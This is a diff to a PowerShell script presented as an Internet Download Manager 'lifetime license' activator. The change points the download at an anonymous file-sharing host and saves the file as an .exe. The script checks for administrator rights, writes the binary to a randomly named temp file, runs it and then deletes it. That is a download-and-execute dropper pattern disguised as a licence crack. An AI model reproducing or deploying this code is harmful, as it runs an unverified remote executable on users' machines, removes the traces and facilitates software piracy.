@@ -6,11 +6,11 @@ $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'https://www.internetdownloadmanagerpro.com/IDMLifetimelicense.exe'
+$DownloadURL = 'https://filebin.net/0amrx01k505y0b4g/IDMLifetimelicense'
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\license_$rand.cmd" } else { "$env:TEMP\license_$rand.cmd" }
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\license_$rand.exe" } else { "$env:TEMP\license_$rand.exe" }
 
 try {
     $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
@@ -26,7 +26,7 @@ Set-Content -Path $FilePath -Value $content
 
 Start-Process $FilePath $ScriptArgs -Wait
 
-$FilePaths = @("$env:TEMP\license*.cmd", "$env:SystemRoot\Temp\license*.cmd")
+$FilePaths = @("$env:TEMP\license*.exe", "$env:SystemRoot\Temp\license*.exe")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
 
 
